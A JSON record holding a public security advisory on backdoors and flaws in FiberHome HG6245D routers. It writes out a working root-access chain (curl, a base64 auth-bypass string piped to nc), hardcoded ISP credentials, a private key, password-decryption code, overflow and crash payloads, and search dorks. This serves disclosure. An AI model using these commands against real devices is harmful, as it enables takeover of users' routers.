{
    "id": "687299fb-4c19-41a7-b4d2-c64c55bddc2f",
    "created_at": "2023-01-12T15:05:09.526472Z",
    "updated_at": "2025-03-27T02:12:54.475301Z",
    "deleted_at": null,
    "sha1_hash": "3f414347cad0590d62efcd4aefd1c4b4a9c9b2e1",
    "title": "2021-01-12 - Multiple vulnerabilities found in FiberHome HG6245D routers",
    "authors": "",
    "file_creation_date": "2022-05-28T17:37:19Z",
    "file_modification_date": "2022-05-28T17:37:19Z",
    "file_size": 358144,
    "plain_text": "# Multiple vulnerabilities found in FiberHome HG6245D routers\n\n**[pierrekim.github.io/blog/2021-01-12-fiberhome-ont-0day-vulnerabilities.html](https://pierrekim.github.io/blog/2021-01-12-fiberhome-ont-0day-vulnerabilities.html)**\n\n## Product Description\n\n### FiberHome Technologies is a leading equipment vendor and global solution provider in the field of information technology and telecommunications.\n\n The FiberHome HG6245D routers are GPON FTTH routers. They are mainly used in South America and in Southeast Asia (from Shodan). These devices come with competitive pricing but are very powerful, with a lot of memory and storage.\n\n I validated the vulnerabilities against HG6245D, RP2602:\n```\nConfig# show version\nshow version\nHardware version : WKE2.094.277A01\nSoftware version : RP2602\nMinor version : 00.00\nBasic part version : RP2602\nGenerate time : Apr 1 2019 19:38:05\n\n UPDATE Feb 7, 2021 - the latest firmware version (RP2613) is also vulnerable. The vulnerabilities have been confirmed in the latest firmware image (RP2613).\n\n Some vulnerabilities have been tested successfully against another fiberhome device (AN5506-04-FA, firmware RP2631, 4 April 2019). The fiberhome devices have quite a similar codebase, so it is likely all other fiberhome devices (AN5506-04-FA, AN5506-04-FAT, AN5506-04-F) are also vulnerable.\n\n On the first analysis, attack surface is not huge:\n\n only HTTP/HTTPS is listening by default on the LAN It is also possible to enable a CLI telnetd (not reachable by default) on port 23/tcp by using hardcoded credentials on the web admin interface ( https://target/fh ).\n\n Futhermore, due to the lack of firewall for IPv6 connectivity, all the internal services will be reachable over IPv6 (from the Internet).\n\n It is in fact trivial to achieve pre-auth RCE as root against the device, from the WAN (using IPv6) and from the LAN (IPv4 or IPv6).\n\n This scenario involves reaching the webserver to:\n\n```\n\n-----\n\n### 1. enable a proprietary CLI telnetd (using backdoor credentials for HTTP or using the\n backdoor /telnet HTTP API or using a stack overflow in the HTTP server in previous fiberhome routers [and skipping next steps]) 2. enable the Linux telnetd using authentication bypass or with backdoor credentials 3. use backdoor credentials to get a root shell on the Linux telnetd\n\n Example of such scenario in 4 steps from a different network:\n```\n$ curl -k https://target/info.asp # pre-auth infoleak, extract the WAN MAC, very\nsimilar to the br0 MAC,\n                 # used to enable the next backdoor. On the same\nnetwork segment,\n                 # use `arp -na`\n$ curl -k 'https://target/telnet?enable=1&key=ENDING_PART_MAC_ADDR' # backdoor\naccess to authorize access\n                                   # to CLI telnet\non port 23/tcp\n$ echo GgpoZWxwCmxpc3QKd2hvCmRkZAp0c2hlbGwK | base64 -d | nc target 23 >/dev/null & #\nauth bypass + start of\n                                          #\nLinux telnetd on port\n                                          #\n26/tcp\n$ telnet target 26        # backdoor root access with root / GEPON\n(none) login: root\nPassword: [GEPON]\nBusyBox v1.27.2 (2019-04-01 19:16:06 CST) built-in shell (ash)\n#id\nuid=0(root) gid=0 groups=0 # game over\n\n Please note this research was done in the beginning of 2020 and a new firmware image may be available and may patch some vulnerabilities (even if I highly doubt it). This research was supposed to be presented during a private security event last year which was postponed due to the COVID-19 situation.\n\n Full-disclosure is applied as it is believed that some backdoors have been intentionally placed by the vendor.\n\n Also, it is public knowledge from 2019 that Fiberhome devices have weak passwords and RCE vulnerabilities. This quote is from 2019:\n\n We didn't see how Gwmndy malware spread, but we know that some Fiberhome router Web systems have weak passwords and there are RCE vulnerabilities.\n\n -- https://blog.netlab.360.com/some-fiberhome-routers-are-being-utilized-as-ssh- tunneling-proxy-nodes-2/\n\n## Vulnerabilities Summary\n\n```\n\n-----\n\n### The summary of the vulnerabilities is:\n\n I removed several DoS and strange technical details (linked to undisclosed vulnerabilities) for clarity.\n\n## Details - Insecure IPv6 connectivity\n\n### By default, there are no firewall rules for the IPv6 connectivity, exposing the internal management interfaces from the Internet.\n\n An attacker can get a full access to the management http server (using hardcoded passwords) and the telnet services, by reaching the IPv6s assigned to the wan0 and the br0 interfaces.\n\n On the device:\n```\n#ifconfig wan0\nwan0   Link encap:Ethernet HWaddr [REMOVED]\n     [...]\n     inet6 addr: [REMOVED]/64 Scope:Global\n     [...]\n     UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1\n#ifconfig br0\nbr0    Link encap:Ethernet HWaddr [REMOVED]\n     inet addr:192.168.1.1 Bcast:192.168.1.255 Mask:255.255.255.0\n     inet6 addr: [REMOVED]/64 Scope:Global\n     [...]\n     UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1\nbr0 is the internal network interface assigned to the LAN. All the services are binding to\n\n both br0 and wan0 .\n\n It is trivial to reach services from the WAN (Internet), by contacting IPv6 used by br0 or\nwan0 :\n\n From the WAN:\n\n```\n\n-----\n\n```\nrasp wan olt% telnet [ipv6] 26\nTrying [ipv6]...\nConnected to [ipv6].\nEscape character is '^]'.\n(none) login: \ntelnet> q\nConnection closed.\nrasp-wan-olt% telnet [ipv6] 80\nTrying [ipv6]...\nConnected to [ipv6].\nEscape character is '^]'.\nGET / HTTP/1.0\nHTTP/1.0 302 Redirect\nServer: GoAhead-Webs/2.5.0 PeerSec-MatrixSSL/3.4.2-OPEN\nDate: Mon Jan 7 21:01:29 2020\nPragma: no-cache\nCache-Control: no-cache\nContent-Type: text/html\nX-Frame-Options: SAMEORIGIN\nLocation: https://\n<html><head></head><body>\n        This document has moved to a new <a href=\"https://\">location</a>.\n        Please update your documents to reflect the new location.\n        </body></html>\nConnection closed by foreign host.\nrasp-wan-olt%\n\n### By using ip6tables on the device, we can confirm the complete lack of firewall rules for IPv6 connectivity:\n\n```\n\n-----\n\n```\n#ip6tables nL\nChain INPUT (policy ACCEPT)\ntarget   prot opt source        destination\nChain FORWARD (policy ACCEPT)\ntarget   prot opt source        destination     \nforward_ext_ip all   ::/0         ::/0        \nforward_ext_url all   ::/0         ::/0        \nforward_ext_mac all   ::/0         ::/0\nChain OUTPUT (policy ACCEPT)\ntarget   prot opt source        destination\nChain forward_ext_ds_ip (1 references)\ntarget   prot opt source        destination\nChain forward_ext_ip (1 references)\ntarget   prot opt source        destination     \nforward_ext_us_ip all   ::/0         ::/0        \nforward_ext_ds_ip all   ::/0         ::/0\nChain forward_ext_mac (1 references)\ntarget   prot opt source        destination\nChain forward_ext_url (1 references)\ntarget   prot opt source        destination\nChain forward_ext_us_ip (1 references)\ntarget   prot opt source        destination     \n#\n\n### I highly recommend disabling IPv6 connectivity.\n\n## Details - HTTP Server - Passwords in HTTP logs\n\n### It is possible to find passwords and authentication cookies stored in clear-text in HTTP logs:\n#cat /fhconf/web_log/web.log\nweb_utils>2020-01-07 19:16:26,../utils/cu_sessionManagement.c[465](findUser): no user\nnamed admin !\n<web_custom>2020-01-07 19:16:27,../custom/weblogin.c[595](webLogin):\n*************userGroupName = 1\n<web_init>2020-01-07 19:16:27,../utils/utils.c[1399](get_admin_default_info): enter\nget_admin_default_info\n<web_custom>2020-01-07 19:16:27,../custom/weblogin.c[812](webLogin): Warning!\nPassword error! password = [REMOVED]\n<web_utils>2020-01-07 19:27:24,../utils/cu_sessionManagement.c[238](createSession):\ncreate user [REMOVED]\n\n## Details - HTTP Server - Harcoded SSL certificates\n\n### The web management is done over HTTPS, using a hardcoded private key with 777 permissions:\n\n```\n\n-----\n\n```\n#ls la /fhrom/bin/web/certSrv.pem /fhrom/bin/web/privkeySrv.pem\n-rwxrwxrwx  1 root   0       883 Apr 1 2019 /fhrom/bin/web/certSrv.pem\n-rwxrwxrwx  1 root   0       887 Apr 1 2019\n/fhrom/bin/web/privkeySrv.pem\n#cat /fhrom/bin/web/privkeySrv.pem\n-----BEGIN RSA PRIVATE KEY----MIICWwIBAAKBgQCY22+N/5InUhmotgU8jh9nQdyTmKYwFJKpvMek9fJK8rCsrED7\nyl+mvUPv3yqLyMgvu1AcMmYEyngpbw94rnd2k91wiRGUGUSq8mTRPFwnplTPI8hI\nJglMsKcskzRP951jxsiSS1eMlLcEd9iMUcpjUbgWzxKH0fFlRD5d8jYPtwIDAQAB\nAoGANEjy6n5d7sc9caD5P5JZmYdEvNO9HLscw6SIIZvjCdHjrtyoybeaaj1ZDKao\nNfIyz2jh6RMwJDlhSsLrZts+jzB+k7fAqUkdLi6fkZmpamL1OEHMqzWdWuVFgCjd\nuf8ZMMuQ+/3gx/tjjG0sBuL/ko1Q7oxoIty+4xm9cwqGGtkCQQDKIJYYp9385gk4\n8qDcdgnc39kmsheUB5VS0pU1/pxL2YIJltq79yghwQisaNsUUk4LMW6hNyPx7Knx\njRpHLsgTAkEAwZkVbjo3Ll+fM+1oPPcY4i960DURrR9eMVhq771n+GzCs9gEy2Ea\nHW5f0yamZBMURZWECu1W0s764QkHXwzWTQJAaYGi95HAVT86NyinAQz4TvvlnMY/\nenyO3GGhk0KpEQqjTyAYYx87KotZXK2LFct0g3E1Hx/qOmDfwH935QotUwJAH4mE\niDRLkO5azOa7uFK4ZwA9DXXXr1AQ1BEHOo6sRTfSb+GcxlTHIEw+p/L/4AWLo9o7\nbFxFbInzLH2ACefZcQJAJ+US+g9Dp4tiLrenketRv9+3nOPGod2WOGqjMaEqOgmC\nRjGu2aI9YguR3FuX3W9KOOg3EDn/l/O1XynBPRO9Aw==\n-----END RSA PRIVATE KEY----#cat /fhrom/bin/web/certSrv.pem\n-----BEGIN CERTIFICATE----MIICXzCCAcgCCQCqr5AgCgFdqzANBgkqhkiG9w0BAQUFADB0MQswCQYDVQQGEwJD\nSDELMAkGA1UECBMCSFUxCzAJBgNVBAcTAldVMQswCQYDVQQKEwJGSDELMAkGA1UE\nCxMCU0YxDDAKBgNVBAMTA1BPTjEjMCEGCSqGSIb3DQEJARYUUE9OQEZJQkVSSE9N\nRS5DT00uQ04wHhcNMTMwNDI0MDEyMTUwWhcNMjMwNDIyMDEyMTUwWjB0MQswCQYD\nVQQGEwJDSDELMAkGA1UECBMCSFUxCzAJBgNVBAcTAldVMQswCQYDVQQKEwJGSDEL\nMAkGA1UECxMCU0YxDDAKBgNVBAMTA1BPTjEjMCEGCSqGSIb3DQEJARYUUE9OQEZJ\nQkVSSE9NRS5DT00uQ04wgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAJjbb43/\nkidSGai2BTyOH2dB3JOYpjAUkqm8x6T18krysKysQPvKX6a9Q+/fKovIyC+7UBwy\nZgTKeClvD3iud3aT3XCJEZQZRKryZNE8XCemVM8jyEgmCUywpyyTNE/3nWPGyJJL\nV4yUtwR32IxRymNRuBbPEofR8WVEPl3yNg+3AgMBAAEwDQYJKoZIhvcNAQEFBQAD\ngYEACZJepEU36h3PMc0O15Bo7zkBWm2dD0RbTrJeZF561VcxlpuE2GDirNCXAbZz\nUe/x+fDQBEM8kqpFYcVMPzZBUdFwu1QIY0DottXVcFFNoKS54GL9LEMaS6l6R/D5\nG8bCy/RF3kZwzE2cflZ7x78zdpQpzzDcOD415ek5zkadhu0=\n-----END CERTIFICATE----#\n\n### Another hardcoded private key is also available (?!) in /fhrom/bin/web and can be downloaded over HTTPS:\n\n```\n\n-----\n\n```\n#ls la /fhrom/bin/web/privkeySrv.pem\n-rwxrwxrwx  1 root   0       887 Apr 1 2019\n/fhrom/bin/web/privkeySrv.pem\n$ curl -k https://192.168.1.1/privkeySrv.pem\n-----BEGIN RSA PRIVATE KEY----MIICWwIBAAKBgQCY22+N/5InUhmotgU8jh9nQdyTmKYwFJKpvMek9fJK8rCsrED7\nyl+mvUPv3yqLyMgvu1AcMmYEyngpbw94rnd2k91wiRGUGUSq8mTRPFwnplTPI8hI\nJglMsKcskzRP951jxsiSS1eMlLcEd9iMUcpjUbgWzxKH0fFlRD5d8jYPtwIDAQAB\nAoGANEjy6n5d7sc9caD5P5JZmYdEvNO9HLscw6SIIZvjCdHjrtyoybeaaj1ZDKao\nNfIyz2jh6RMwJDlhSsLrZts+jzB+k7fAqUkdLi6fkZmpamL1OEHMqzWdWuVFgCjd\nuf8ZMMuQ+/3gx/tjjG0sBuL/ko1Q7oxoIty+4xm9cwqGGtkCQQDKIJYYp9385gk4\n8qDcdgnc39kmsheUB5VS0pU1/pxL2YIJltq79yghwQisaNsUUk4LMW6hNyPx7Knx\njRpHLsgTAkEAwZkVbjo3Ll+fM+1oPPcY4i960DURrR9eMVhq771n+GzCs9gEy2Ea\nHW5f0yamZBMURZWECu1W0s764QkHXwzWTQJAaYGi95HAVT86NyinAQz4TvvlnMY/\nenyO3GGhk0KpEQqjTyAYYx87KotZXK2LFct0g3E1Hx/qOmDfwH935QotUwJAH4mE\niDRLkO5azOa7uFK4ZwA9DXXXr1AQ1BEHOo6sRTfSb+GcxlTHIEw+p/L/4AWLo9o7\nbFxFbInzLH2ACefZcQJAJ+US+g9Dp4tiLrenketRv9+3nOPGod2WOGqjMaEqOgmC\nRjGu2aI9YguR3FuX3W9KOOg3EDn/l/O1XynBPRO9Aw==\n-----END RSA PRIVATE KEY----\n## Details - HTTP server - Pre-auth InfoLeak\n\n### It is possible to extract information from the device without authentication by disabling Javascript and visiting /info.asp :\n$ curl -k https://192.168.1.1/info.asp\n[..]\nSoftware Version: [REMOVED]\n[...]\nONU State: [REMOVED]\nRegist State: [REMOVED]\nLOID: [REMOVED] <----------- Secret used for FTTH connection\n[...]\nIP Address: [REMOVED]\nSubnet Mask: [REMOVED]\nIPv6 Address: [REMOVED]\nDHCP Clients List: [REMOVED]\nWan IP: [REMOVED]\nWAN Mac: [REMOVED] <-------- Used for the telnet backdoor\n[...]\n\n Also, it is very easy to guess the MAC address of the br0 interface based on the WAN MAC address (e.g.: wan0 : xx:xx:xx:xx:xx:x3, br0 will be xx:xx:xx:xx:xx:x0 ).\n\n## Details - HTTP Server - Backdoor allowing telnet access\n\n### In order to reach the telnetd CLI server, it is also possible to reach a backdoor API without authentication provided by the HTTP server. This will remove firewall rules and allow an attacker to reach the telnet server (used for CLI).\n\n```\n\n-----\n\n### This backdoor can be found inside the webs binary:\n\n From sub_C46F8() (called from main()):\n\n Pseudo-code of sub_C46F8() The backdoor_telnet() function (named during reverse engineering, the original name is unknown):\n\n Pseudo-code of backdoor_telnet() We can reverse the function omci_set_telnet_uni_state() from libgl3_advance.so :\n\n\n-----\n\n### Pseudo-code of omci_set_telnet_uni_state() On line 24, rules will be added depending of the value of the argument of this function.\n\n Finally, the getOnuMac() function will provide a custom valid entry from the MAC address of the br0 interface:\n\n Pseudo-code of getOnuMac()\n\n\n-----\n\n### The backdoor is reachable by sending a HTTPS request:\n\n```\nhttps://[ip]/telnet?enable=0&key=calculated(BR0_MAC)\n\n```\n\n### The 'secret' algorithm will extract the ending part of the mac address.\n\n For the MAC: AA:AA:AA:01:02:03, an attacker can enable the backdoor by sending:\n```\n$ curl -k 'https://[ip]/telnet?enable=1&key=010203'\n\n Opening the access to the telnetd:\n$ curl -k 'https://192.168.1.1/telnet?enable=1&key=[REMOVED]'\nOpen telnet success!\n$ telnet 192.168.1.1\nTrying 192.168.1.1...\nConnected to 192.168.1.1.\nEscape character is '^]'.\n------acl IP:192.168.1.2 -------Login: \ntelnet> q\nConnection closed.\n\n Closing the access to the telnetd:\n$ curl -k 'https://192.168.1.1/telnet?enable=0&key=[REMOVED]'\n$ telnet 192.168.1.1 23\nTrying 192.168.1.1...\ntelnet: connect to address 192.168.1.1: Connection refused\ntelnet: Unable to connect to remote host\n\n The IPv4 firewall rules before and after triggering the backdoor:\n\n Access is being blocked:\n#iptables-save |grep telnet\n:input_ext_access_telnet_ani - [0:0]\n:input_ext_access_telnet_uni - [0:0]\n-A input_ext_access_ctrl -p tcp -m tcp --dport 23 -j input_ext_access_telnet_uni\n-A input_ext_access_ctrl -p tcp -m tcp --dport 23 -j input_ext_access_telnet_ani\n-A input_ext_access_telnet_ani -i tel0 -p tcp -m tcp --dport 23 -j ACCEPT\n-A input_ext_access_telnet_ani -i br0 -p tcp -m tcp --dport 23 -j ACCEPT\n-A input_ext_access_telnet_ani -p tcp -m tcp --dport 23 -j REJECT --reject-with tcpreset\n-A input_ext_access_telnet_uni -i br0 -p tcp -m tcp --dport 23 -j REJECT --rejectwith tcp-reset\n\n Access is allowed:\n\n```\n\n-----\n\n```\n#iptables save |grep telnet\n:input_ext_access_telnet_ani - [0:0]\n:input_ext_access_telnet_uni - [0:0]\n-A input_ext_access_ctrl -p tcp -m tcp --dport 23 -j input_ext_access_telnet_uni\n-A input_ext_access_ctrl -p tcp -m tcp --dport 23 -j input_ext_access_telnet_ani\n-A input_ext_access_telnet_ani -i tel0 -p tcp -m tcp --dport 23 -j ACCEPT\n-A input_ext_access_telnet_ani -i br0 -p tcp -m tcp --dport 23 -j ACCEPT\n-A input_ext_access_telnet_ani -p tcp -m tcp --dport 23 -j REJECT --reject-with tcpreset\n\n## Details - HTTP Server - Hardcoded credentials\n\n### The web daemon contains a list of hardcoded credentials, for different ISPs:\n\n user / user1234 f~i!b@e#r$h%o^m*esuperadmin / s(f)u_h+g|u admin / lnadmin admin / CUadmin admin / admin telecomadmin / nE7jA%5m adminpldt / z6dUABtl270qRxt7a2uGTiw gestiontelebucaramanga / t3l3buc4r4m4ng42013 rootmet / m3tr0r00t awnfibre / fibre@dm!n trueadmin / admintrue admin / G0R2U1P2ag admin / 3UJUh2VemEfUtesEchEC2d2e admin / getOnuMac(s, 6, 32); <- last part of the MAC address of the br0 interface admin / 888888 L1vt1m4eng / 888888 useradmin / 888888 user / 888888 admin / 1234 user / tattoo@home admin / tele1234 admin / aisadmin\n\n You can find the incomplete list below:\n\n```\n\n-----\n\n-----\n\n### I really like m3tr0r00t :)\n\n There are passwords everywhere in the webs binary (HTTP Server).\n\n These credentials, used with https://ip/fh will allow to open the access to the CLI telnet on port 23/tcp.\n\n## Details - HTTP Server - TR-069 hardcoded credentials\n\n### We can find hardcoded credentials inside the webs binary for TR-069:\n\n```\ntelecomadmin\n\n```\n\n-----\n\n### Pseudo-code from webs\n\n## Details - HTTP Server - Credentials decryption algorithm\n\n### By default, some credentials appear to be encrypted (in /fhconf/umconfig.txt file).\n\n It is possible to decrypt them using the encryption function found inside the webs binary. This algorithm uses mainly xor with the hardcoded key *j7a(L#yZ98sSd5HfSgGjMj8;Ss;d)\n```\n(*&^#@$a2s0i3g so we can encrypt passwords and decrypt \"encrypted\" passwords:\n\n Pseudo-code from decrypt_password() A re-implementation in C can be shown below:\n\n```\n\n-----\n\n```\n#include <stdio.h>\n#include <string.h>\nint    main(int  argc,\n        char  **argv,\n        char  **envp)\n{\n char key[45] = \"*j7a(L#yZ98sSd5HfSgGjMj8;Ss;d)(*&^#@$a2s0i3g\";\n char password[12] = \"\\x59\\x42\\x51\\x48\\x5d\\x13\\x4b\\x52\\x3d\\x45\\x4d\\x00\";\n //char password[12] = \"s(f)u_h+g|u\\x00\";\n unsigned char encrypted_char;\n for (int i = 0; i < strlen(password); i++)\n {\n  encrypted_char = password[i] ^ key[i % sizeof(key)];\n  if (encrypted_char && !(encrypted_char & 0x2000))\n   printf(\"%c\", encrypted_char);\n }\n printf(\"\\n\");\n return (0);\n}\n\n### And it works:\n$ cc decrypt-passwords-umconfig.c -o decrypt-passwords-umconfig && ./decryptpasswords-umconfig | hexdump -C\n00000000 73 28 66 29 75 5f 68 2b 67 7c 75 0a       |s(f)u_h+g|u.|\n0000000c\n\n Interesting fact: we previously found this hardcoded key in FTTH OLTs from another FTTH vendor:\n\n https://pierrekim.github.io/blog/2020-07-07-cdata-olt-0day-vulnerabilities.html#weak- encryption-algorithm\n\n It appears this key and this algorithm come from GoAhead:\n\n https://github.com/BruceYang-yeu/goahead-1/blob/master/um.c#L51\n\n## Details - Telnet server (Linux) - Hardcoded credentials\n\n### A hardcoded password for root is being defined inside /etc/init.d/system-config.sh :\n\n```\n\n-----\n\n```\n#cat /etc/init.d/system config.sh\n#!/bin/sh\ncase \"$1\" in\n    start)\n        echo \"Configuring system...\"\n        # these are some miscellaneous stuff without a good home\n        mount -o remount,sync /fhconf\n        mkdir -p /dev/shm/fhdrv_kdrv_ver_tmp /dev/shm/usr_tmp /fhconf/data\n        echo \"root:W/xa5OyC3jjQU:0:0:root:/:bin/sh\" > /etc/passwd\n        echo \"nobody:x:99:99:Nobody:/:/bin/false\" >> /etc/passwd\n        ifconfig lo 127.0.0.1 netmask 255.0.0.0 broadcast 127.255.255.255 up\n        echo > /var/udhcpd/udhcpd.leases\n        exit 0\n        ;;\n# cat /etc/passwd\nroot:W/xa5OyC3jjQU:0:0:root:/:bin/sh\nnobody:x:99:99:Nobody:/:/bin/false\nW/xa5OyC3jjQU is the DES encrypted data for GEPON .\n\n### This telnet server doesn't run by default but it is possible to start it from the telnet CLI.\n\n## Details - Telnet server (CLI) - Hardcoded credentials\n\n### telnet on port 23/tcp can be also abused with these credentials:\n   gpon / gpon\n\n enable: gpon\n\n Demo:\n$ nc -v 192.168.1.1 23\nConnection to 192.168.1.1 23 port [tcp/telnet] succeeded!\n------acl IP:192.168.1.2 -------Login: gpon\ngpon\nPassword: gpon\nUser> enable\nenable\nPassword: gpon\n****\nConfig#\n\n We can retrieve these backdoors by reversing the libci_adaptation_layer.so library:\n\n```\n\n-----\n\n### Pseudo-code of addDefualLoginAndUser() from libci_adaptation_layer.so For specific ISPs, there are these valid credentials:\n```\n   admin / 4 hexadecimal chars, generated in the init_3bb_password() function\n\n located in libci_adaptation_layer.so\n   rdsadmin / 6GFJdY4aAuUKJjdtSn7d\n\n You can also test gepon / gepon (from the firmware extracted in the other analyzed fiberhome device (AN5506-04-FA, firmware RP2631, 4 April 2019)).\n\n## Details - Telnet server (CLI) - Privilege escalation\n\n### The CLI telnet server runs on port 23/tcp and can be reached by (i) adding firewall rules from the HTTP server either using the backdoor API, (ii) using backdoor credentials on the web interface or (iii) exploiting a stack overflow in previous HTTP daemons. It is also reachable by default over IPv6 on br0 and wan0 interface.\n\n It is possible to start a Linux telnetd as root on port 26/tcp using the CLI interface, as shown below:\n\n```\n\n-----\n\n```\nUser> ddd\nWRI(DEBUG_H)> shell\nPlease use port 26 to telnet \nWRI(DEBUG_H)> tshell\nPlease use port 26 to telnet\nshell and tshell will call the function enter_telnet_shell() from\nlibcli_cli.so, running system(\"telnet -p 26\") . This telneld will then use hardcoded\n\n### credentials.\n\n Pseudo-code of enter_telnet_shell() Surprisingly, there is another function called enter_tshell (for a legacy tshell ) which will run a system(\"sh\") as root.\n\n This function enter_tshell() providing a rootshell is not being called from shell so this looks like dead code:\n\n Pseudo-code of enter_tshell()\n\n## Details - Telnet server (CLI) - Authentication bypass\n\n```\n\n-----\n\n### It is possible to bypass telnet authentication by sending a specific string to the remote telnet server:\n```\n$ echo 'GgpoZWxwCmxpc3QKd2hvCg==' | base64 -d > bypass-auth-telnet\n$ hexdump -C bypass-auth-telnet\n00000000 1a 0a 68 65 6c 70 0a 6c 69 73 74 0a 77 68 6f 0a |..help.list.who.|\n00000010\n$ nc 192.168.1.1 23 < bypass-auth-telnet\n------acl IP:192.168.1.2 -------Login: \nUser> \nUser> help\n   This system provides help feature as described below.\n   1. Anytime you need help, just press \"?\" and don't\n press Enter,you can see each possible command argument\n and its description.\n   2. You can also input \"list\" and then press Enter\n to execute this helpful command to view the list of\n commands you can use.\nUser> list\n 0. clear\n 1. enable\n 2. exit\n 3. help\n 4. list\n 5. ping {[-t]}*1 {[-count] <1-65535>}*1 {[-size] <1-6400>}*1 {[-waittime] <1-255>}*1\n{[-ttl] <1-255>}*1 {[-pattern] <user_pattern>}*1 {[-i] <A.B.C.C>}*1 <A.B.C.D> \n 6. quit\n 7. show history\n 8. show idle-timeout\n 9. show ip\n10. show services\n11. show syscontact\n12. show syslocation\n13. terminal length <0-512>\n14. who\n15. who am i\nUser> who\nSessionID. - UserName ---------- LOCATION ---------- MODE ---- \n7      not login      192.168.1.2     not login (That's me.)\nTotal 1 sessions in current system. \nUser>\n\n## Details - Telnet server (CLI) - Authentication bypass to start the Linux telnetd\n\n```\n\n-----\n\n### It is possible to use the previous authentication bypass to start a full telnetd server on port 26 and then get a root shell using the password from Telnet server (Linux) - Hardcoded credentials.\n\n By sending ddd then tshell, a telnetd will be started on port 26/tcp:\n```\n$ echo GgpoZWxwCmxpc3QKd2hvCmRkZAp0c2hlbGwK | base64 -d | nc target 23 &\n------acl IP:192.168.1.2 -------Login: \nUser> \nUser> help\n   This system provides help feature as described below.\n   1. Anytime you need help, just press \"?\" and don't\n press Enter,you can see each possible command argument\n and its description.\n   2. You can also input \"list\" and then press Enter\n to execute this helpful command to view the list of\n commands you can use.\nUser> list\n 0. clear\n 1. enable\n 2. exit\n 3. help\n$ telnet target 26\nTrying target...\nConnected to target.\nEscape character is '^]'.\n(none) login: root\nPassword: [GEPON]\nBusyBox v1.27.2 (2019-04-01 19:16:06 CST) built-in shell (ash)\nEnter 'help' for a list of built-in commands.\n#id\nuid=0(root) gid=0 groups=0\n\n The attacker will get a root shell.\n\n## Details - Telnet server (CLI) - DoS\n\n### It is possible to crash the telnet daemon by sending a specific string:\n\n```\n\n-----\n\n```\n$ hexdump C crash auth telnet \n00000000 1a 0a 65 6e 61 62 6c 65 0a 02 0a 1a 0a      |..enable.....|\n0000000d\n$ nc -v 192.168.1.1 23 < crash-auth-telnet \n192.168.1.1: inverse host lookup failed: Host name lookup failure\n(UNKNOWN) [192.168.1.1] 23 (telnet) open\n$ nc -v 192.168.1.1 23 < crash-auth-telnet \n192.168.1.1: inverse host lookup failed: Host name lookup failure\n(UNKNOWN) [192.168.1.1] 23 (telnet) : Connection refused\n\n### This segfault exists inside /fh/extend/load_cli but was not studied as the previous bypass already worked.\n\n## Details - System - Credentials stored in clear-text\n\n### Some credentials are stored in clear-text with permissive rights:\n\n```\n\n-----\n\n```\n#pwd\n/fhconf/fh_wifi\n#ls -la \ndrwxr-xr-x  2 root   0       536 Jan 7 2020 .\ndrwxr-xr-x  14 root   0      10264 Jan 8 15:29 ..\n-rw-r--r--  1 root   0       118 Jan 1 1970 wifi_custom.cfg\n-rw-r--r--  1 root   0       1212 Jan 7 2020 wifictl_2g.cfg\n-rw-r--r--  1 root   0       1178 Jan 7 2020 wifictl_2g.cfg.bak\n-rw-r--r--  1 root   0       1213 Jan 7 2020 wifictl_5g.cfg\n-rw-r--r--  1 root   0       1208 Jan 7 2020 wifictl_5g.cfg.bak\n#cat /fhconf/fh_wifi/wifi_custom.cfg \nssid_2g=[REMOVED]\nssid_5g=[REMOVED]\ncountry=BR\nauth=WPAPSKWPA2PSK\nencrypt=tkipaes\npsk=[REMOVED]\n#\n#cat wifictl_2g.cfg\n[...]\nWPAPSK=[REMOVED]\n[...]\nWEPKey1=[REMOVED]\n[...]\nWEPKey2=[REMOVED]\n[...]\nWEPKey3=[REMOVED]\n[...]\nWEPKey4=[REMOVED]\n[...]\nRadiusKey=[REMOVED]\n#cat wifictl_5g.cfg\nSSID=[REMOVED]\n[...]\nWPAPSK=[REMOVED]\n[...]\nWEPKey1=[REMOVED]\n[...]\nWEPKey2=[REMOVED]\n[...]\nWEPKey3=[REMOVED]\n[...]\nWEPKey4=[REMOVED]\n[...]\nRadiusKey=[REMOVED]\n\n## Details - Misc - Passwords stored in clear-text in nvram\n\n### Some passwords are stored in clear-text in nvram:\n\n```\n\n-----\n\n```\n#nvram show\nwl0.1_key=1\nwl0.1_key1=[REMOVED]\nwl0.1_key2=[REMOVED]\nwl0.1_key3=[REMOVED]\nwl0.1_key4=[REMOVED]\n[...]\nwl0.1_ssid=[REMOVED]\n[...]\nwl0.1_wpa_psk=[REMOVED]\n[...]\nwl0_key1=[REMOVED]\nwl0_key2=[REMOVED]\nwl0_key3=[REMOVED]\nwl0_key4=[REMOVED]\n[...]\nwl0_ssid=[REMOVED]\n[...]\nwl0_wpa_psk=[REMOVED]\n[...]\n[ passwords everywhere removed because of space ]\n[...]\n\n## Details - Misc - Remote stack overflow in the HTTP server (AN5506- 04-FA / RP2631)\n\n### I got another Fiberhome device with a different firmware version (AN5506-04-FA, firmware RP2631, 4 April 2019). The HG6245D and the AN5506-04-FA devices share a very similar code base.\n\n The firmware on the AN5506-04-FA device is vulnerable to a remote stack overflow in the\nwebs process by sending a Cookie value with a length > 511 bytes to any valid asp\n\n webpage. This can be triggered using a simple wget command:\n$ wget --no-check-certificate -O- --header 'Cookie: loginName=AAAA[511bytes]AAAA'\nhttps://192.168.1.1/tr069/tr069.asp\n\n In the HG6245D firmware version RP2602, this vulnerability has been patched by checking the size of values in the cookies, so I was not able to exploit it. You can also read the log file to confirm the length is now checked:\n<web_ga>2020-01-08 21:23:12,../thd_ga2_5/webs.c[1375](websParseRequest): Request\nheader param value is too long! key: cookie\n\n It appears it has been patched in the HG6245D router, firmware RP2602. Firmware RP2631 (4 April 2019) for router AN5506-04-FA remains vulnerable. I found no CVE or public research about this vulnerability so it may have been silently patched by the vendor for the HG6245D router.\n\n## Dorks\n\n```\n\n-----\n\n```\nacl IP:\n\n```\n```\nGoAhead-Webs/2.5.0 PeerSec-MatrixSSL/3.4.2-OPEN\n\n```\n\n## Vendor Response\n\n### Full-disclosure is applied as it is believed that some backdoors have been intentionally placed by the vendor.\n\n## Report Timeline\n\n### Jan 7, 2020: Majority of vulnerabilities found. Jan 8, 2020: This advisory was written. Aug 2020: Found the lack of IPv6 firewall. Jan 9, 2021: Vulnerabilities checked again and the advisory was rewritten. Jan 12, 2021: A public advisory is sent to security mailing lists. Feb 7, 2021: The latest firmware version (RP2613) is confirmed to be vulnerable. Feb 10, 2021: MITRE provides CVE-2021-27139, CVE-2021-27140, CVE-2021-27141, 